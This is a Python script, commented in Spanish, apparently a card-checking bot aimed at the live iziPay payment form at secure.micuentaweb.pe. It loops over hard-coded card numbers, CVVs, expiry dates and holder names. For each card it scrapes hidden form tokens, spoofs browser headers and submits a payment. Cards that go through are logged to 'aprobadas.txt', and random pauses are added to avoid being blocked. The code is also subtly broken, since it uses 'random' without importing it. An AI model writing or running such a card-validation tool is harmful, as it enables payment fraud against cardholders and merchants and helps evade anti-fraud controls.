import requests
from bs4 import BeautifulSoup
import time
import json # Aunque no mandamos JSON, puede ser útil para ver datos

# Lista de tarjetas a procesar
TARJETAS = [
    {
        "numero": "4349250487781661",
        "cvv": "386",
        "mes": "1",
        "anio": "2030",
        "titular": "JUAN PEREZ"
    },
    {
        "numero": "4349250487781646",
        "cvv": "831",
        "mes": "1",
        "anio": "2030",
        "titular": "CARLOS RODRIGUEZ"
    },
]

# La URL del formulario (tomada de tu captura)
URL_IZIPAY = "https://secure.micuentaweb.pe/vads-payment/exec.card_input.a"

# Cabeceras para simular ser un navegador normal
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Origin': 'https://secure.micuentaweb.pe',
    'Referer': URL_IZIPAY, # Es bueno decirle al servidor de dónde venimos
}

def procesar_tarjeta_izipay(tarjeta):
    """
    Realiza el proceso completo de 2 pasos: GET para obtener tokens y POST para enviar el pago.
    """
    print(f"\n--- Probando Tarjeta ---")
    print(f"Número: ...{tarjeta['numero'][-4:]} | Titular: {tarjeta['titular']}")

    # Usamos una sesión para que las cookies se manejen automáticamente entre peticiones
    session = requests.Session()
    session.headers.update(HEADERS)

    try:
        # --- PASO 1: OBTENER LOS CAMPOS OCULTOS (GET) ---
        print("Paso 1: Obteniendo tokens de la página...")
        response_get = session.get(URL_IZIPAY)
        response_get.raise_for_status() # Lanza un error si la página no carga

        # Usamos BeautifulSoup para parsear el HTML de la página
        soup = BeautifulSoup(response_get.text, 'html.parser')

        # Extraemos el valor de cada campo oculto que necesitamos
        hidden_fields = {}
        for field_name in ['cacheId', 'vads_payment_id', 'vads_payment_card_type', 'vads_payment_card_code', 'vads_payment_option_code']:
            input_tag = soup.find('input', {'name': field_name})
            if input_tag and 'value' in input_tag.attrs:
                hidden_fields[field_name] = input_tag['value']
            else:
                print(f"ADVERTENCIA: No se encontró el campo oculto '{field_name}'")
                hidden_fields[field_name] = "" # Ponemos un valor por defecto si no se encuentra
        
        print(f"Tokens obtenidos: cacheId={hidden_fields.get('cacheId', 'N/A')}, vads_payment_id={hidden_fields.get('vads_payment_id', 'N/A')}")

        # --- PASO 2: CONSTRUIR Y ENVIAR EL PAYLOAD (POST) ---
        # Este payload ahora incluye TODOS los campos de tu captura.
        payload = {
            'cacheId': hidden_fields.get('cacheId'),
            'browserScreenWidth': '1920', # Podemos dejar valores fijos
            'browserScreenHeight': '1080',
            'timeZone': '300', # (Perú UTC-5, 5*60=300)
            'colorDepth': '24',
            'vads_info_form': 'generic',
            'vads_card_number': tarjeta['numero'],
            'vads_expiry_month': tarjeta['mes'],
            'vads_expiry_year': tarjeta['anio'],
            'vads_cvv': tarjeta['cvv'],
            'vads_card_holder_name': tarjeta['titular'],
            'vads_payment_card_type': hidden_fields.get('vads_payment_card_type'),
            'vads_payment_card_code': hidden_fields.get('vads_payment_card_code'),
            'vads_payment_option_code': hidden_fields.get('vads_payment_option_code'),
            'vads_payment_id': hidden_fields.get('vads_payment_id'),
        }

        print("Paso 2: Enviando formulario de pago...")
        response_post = session.post(URL_IZIPAY, data=payload, timeout=30)

        # Comprobamos el texto de la respuesta HTML
        if "Su solicitud de pago ha sido denegada" in response_post.text:
            print("Resultado: ❌ DENEGADA")
        elif "Su pago ha sido aceptado" in response_post.text: # Asumiendo un posible mensaje de éxito
            print("Resultado: ✅ ¡APROBADA!")
            with open("aprobadas.txt", "a") as f:
                f.write(f"{tarjeta['numero']}|{tarjeta['mes']}|{tarjeta['anio']}|{tarjeta['cvv']}\n")
        else:
            print("Resultado: ❓ RESPUESTA DESCONOCIDA.")
            # with open(f"respuesta_{tarjeta['numero']}.html", "w") as f:
            #     f.write(response_post.text)

    except requests.exceptions.RequestException as e:
        print(f"Error de conexión: {e}")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")


# --- Bucle Principal ---
if __name__ == "__main__":
    print("Iniciando bot para iziPay...")
    for t in TARJETAS:
        procesar_tarjeta_izipay(t)
        # Pausa entre intentos para no ser bloqueado
        time.sleep(random.randint(3, 6)) # Pausa aleatoria entre 3 y 6 segundos

    print("\nProceso finalizado.")
